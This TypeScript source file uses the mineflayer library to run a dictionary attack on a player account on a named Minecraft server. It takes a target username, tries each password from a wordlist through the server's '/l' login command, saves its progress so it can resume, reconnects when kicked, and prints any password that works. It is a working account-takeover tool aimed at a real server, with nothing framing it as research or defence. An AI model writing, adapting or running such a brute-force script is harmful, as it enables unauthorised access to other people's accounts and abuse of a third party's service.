import { Bot, ChatMessage, createBot } from "mineflayer";
import crypto from "crypto";
import { delay } from "q";
import { messageLoggedIn, messageLoginFailed, messageRegisterFailed, messageWaitForLogin, messageWaitForRegister } from "./constants";
import { Minecraft } from "./minecraft";
import { promises as fs } from "fs";
import { last, lastIndexOf } from "lodash";
import Logger from "bunyan";

async function createMinecraftInstance(username: string) {
	const mc = new Minecraft({
		username,
		host: 'wolfxmc.org',
		port: 25565
	}, Logger.WARN);
	await mc.waitForMessage(messageWaitForLogin, [messageWaitForRegister]);
	return mc;
}

async function tryPassword(mc: Minecraft, password: string) {
	mc.bot.chat(`/l ${password}`);
	try {
		await mc.waitForMessage(messageLoggedIn, messageLoginFailed);
		return true;
	} catch (e) {
		return false;
	}
}

async function runOnce(targetUser: string) {
	let lastSequence = 0;
	try {
		lastSequence = JSON.parse(await fs.readFile("./data/last.json", "utf-8")).lastSequence;
		console.log(`Will start from ${lastSequence}.`);
	} catch (e) {
		console.log(`Will start from beginning.`);
	}
	const dict = (await fs.readFile("./data/dict.txt", "utf-8")).split("\n");
	let mc: Minecraft;
	//await waitBotLogin(bot);
	//await delay(1000);
	try {
		for (let i = lastSequence; i < dict.length; ++i) {
			if (!mc || mc.died) {
				console.log("Connecting.");
				mc = await createMinecraftInstance(targetUser);
			}
			await fs.writeFile("./data/last.json", JSON.stringify({ lastSequence: i }));
			const password = dict[i];
			console.log(`Trying password ${password}`)
			if (await tryPassword(mc, password)) {
				console.log(`Success. Username: ${targetUser} Password: ${password}`);
				break;
			}
		}
	} catch (e) {
		console.log(`Failed: ${e.toString()}`);
	} finally {
		mc.bot.end();
		console.error(`Finished.`);
	}
}
runOnce(process.argv[2]);
